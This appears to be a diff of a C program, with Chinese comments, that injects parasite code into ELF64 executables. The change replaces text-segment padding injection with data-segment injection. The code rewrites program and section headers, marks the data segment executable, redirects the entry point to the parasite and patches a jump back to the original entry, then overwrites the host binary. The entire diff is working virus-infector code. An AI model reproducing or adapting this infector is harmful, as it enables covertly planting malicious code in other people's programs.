@@ -7,10 +7,9 @@
  *
  */
 
-
 /*
-该注入算法由于是将text段从前面位置扩展0x1000，因此所有的表字段中，绝对加载地址-0x1000，偏移均+0x1000
-*/
+ *data段注入
+ */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -24,12 +23,11 @@
 
 #define PAGE_SIZE 4096
 #define TMP "tmp.bin"
-
 extern int return_entry_start;
 struct stat st;
 char *host;
 
-unsigned long entry_point;
+unsigned long entry_point, o_shoff, bss_addr;
 int ehdr_size; 
 
 void mirror_binary_with_parasite(unsigned int, unsigned char *, char *);
@@ -40,7 +38,7 @@ int main(int argc, char **argv)
 	
 	unsigned char *tp;
 	int fd, i, c;
-	char text_found;
+	char data_found;
 	mode_t mode;
 	
 	extern char parasite[];
@@ -94,40 +92,39 @@ int main(int argc, char **argv)
 	
        printf("Parasite size: %d\n", parasite_size);
        
-       text_found = 0;
+       data_found = 0;
        unsigned int after_insertion_offset;
        ehdr_size = sizeof(*e_hdr);
        entry_point = e_hdr->e_entry; 
-		//由于程序头表中，text段的p_offset为0，其他的所有的类型表都比它大，因此就是导致所有的表都加了0x1000
-		//0 和 1为手动加， 2一般为text，text_found置为1之后，后面的的也会执行p_hdr->p_offset += PAGE_SIZE;
+	   o_shoff = e_hdr->e_shoff;
+       e_hdr->e_shoff += parasite_size;
        p_hdr = (Elf64_Phdr *)(mem + e_hdr->e_phoff);
-       p_hdr[0].p_offset += PAGE_SIZE;
-       p_hdr[1].p_offset += PAGE_SIZE;
-
+       
        for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) 
        {	 
-       	   if (text_found)
-	 	  p_hdr->p_offset += PAGE_SIZE;
-
            if(p_hdr->p_type == PT_LOAD)
-	        if (p_hdr->p_flags == (PF_R | PF_X))
+	        if (p_hdr->p_offset != 0)
 	        {
-			  p_hdr->p_vaddr -= PAGE_SIZE;
-			  e_hdr->e_entry = p_hdr->p_vaddr;
-			  p_hdr->p_paddr -= PAGE_SIZE;
-			  p_hdr->p_filesz += PAGE_SIZE;
-			  p_hdr->p_memsz += PAGE_SIZE;
-			  text_found = 1;
+			  bss_addr = p_hdr->p_offset + p_hdr->p_filesz;
+			  e_hdr->e_entry = p_hdr->p_vaddr + p_hdr->p_filesz;
+			  p_hdr->p_filesz += parasite_size;
+			  p_hdr->p_memsz += parasite_size;
+			  data_found = 1;
+			  p_hdr->p_flags |= PF_X;
 	        }
         }  
-	e_hdr->e_entry += sizeof(*e_hdr);
-	//因为是逆向拓展0x1000，因此所有的偏移相对于原来的文件头相当于off-0变成off-(-0x1000)=off+0x1000=off+PAGE_SIZE
-	 s_hdr = (Elf64_Shdr *)(mem + e_hdr->e_shoff);
-	 for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
-		s_hdr->sh_offset += PAGE_SIZE;
+	//e_hdr->e_entry += sizeof(*e_hdr);
 	
-	 e_hdr->e_shoff += PAGE_SIZE;
-	 e_hdr->e_phoff += PAGE_SIZE;
+	 s_hdr = (Elf64_Shdr *)(mem + o_shoff);
+	for(i=0; i<e_hdr->e_shnum; i++)
+	 {
+		 if(s_hdr[i].sh_offset >= bss_addr)
+        {
+            //printf("[+] Offset of section need to edit is 0x%X\n", s_hdr[i].sh_offset);
+            s_hdr[i].sh_offset += parasite_size;
+        }
+	 }
+		
  	 
 	 printf("new entry: %lx\n", e_hdr->e_entry);
 	 mirror_binary_with_parasite(parasite_size, mem, parasite);
@@ -137,61 +134,40 @@ int main(int argc, char **argv)
  	 close(fd);
  	  	  
  }
-
 void mirror_binary_with_parasite(unsigned int psize, unsigned char *mem, char *parasite)
 {
-	
-	int ofd;
-	unsigned int c;
-	int i, t = 0;
-	
-	/* eot is: 
-	 * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
-	 * end_of_text += p_hdr->p_filesz;
-	 */ 
+    int ofd;
+    int c;
 
-	printf("Mirroring host binary with parasite %d bytes\n",psize);
+    printf("Mirroring host binary with parasite %d bytes\n",psize);
+    if((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
+    {
+        perror("tmp binary: open");
+        goto _error;
+    }
+    //写入到data段结尾的数据
+    if ((c = write(ofd, mem, bss_addr)) != bss_addr)
+    {
+        printf("failed writing ehdr\n");
+        goto _error;
+    }
 
-	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
-	{
-		perror("tmp binary: open");
-		exit(-1);
-	}
-	
-	if ((c = write(ofd, mem, ehdr_size)) != ehdr_size)
-	{
-		printf("failed writing ehdr\n");
-		exit(-1);
-	}
-	
-	printf("Patching parasite to jmp to %lx\n", entry_point);
-	
-	*(unsigned int *)&parasite[return_entry_start] = entry_point;
-	
+    printf("Patching parasite to jmp to %lx\n", entry_point);
+    //写入寄生代码
+    *(unsigned int *)&parasite[return_entry_start] = entry_point;
+    if ((c = write(ofd, parasite, psize)) != psize)
+    {
+        perror("writing parasite failed");
+        goto _error;
+    }
 
-	if ((c = write(ofd, parasite, psize)) != psize)
-	{
-		perror("writing parasite failed");
-		exit(-1);
-	}
-	
-	if ((c = lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET)) != ehdr_size + PAGE_SIZE)
-	{
-		printf("lseek only wrote %d bytes\n", c);
-		exit(-1);
-	}
-
-	mem += ehdr_size;
-	
-	if ((c = write(ofd, mem, st.st_size-ehdr_size)) != st.st_size-ehdr_size)
-	{
-		printf("Failed writing binary, wrote %d bytes\n", c);
-		exit(-1);
-	}
-	
+    mem += bss_addr;
+    if ((c = write(ofd, mem, st.st_size-bss_addr)) != st.st_size-bss_addr)
+    {
+        printf("Failed writing binary, wrote %d bytes\n", c);
+        goto _error;
+    }
 	rename(TMP, host);
-	close(ofd);
-	
+_error:
+    close(ofd);
 }
-
-
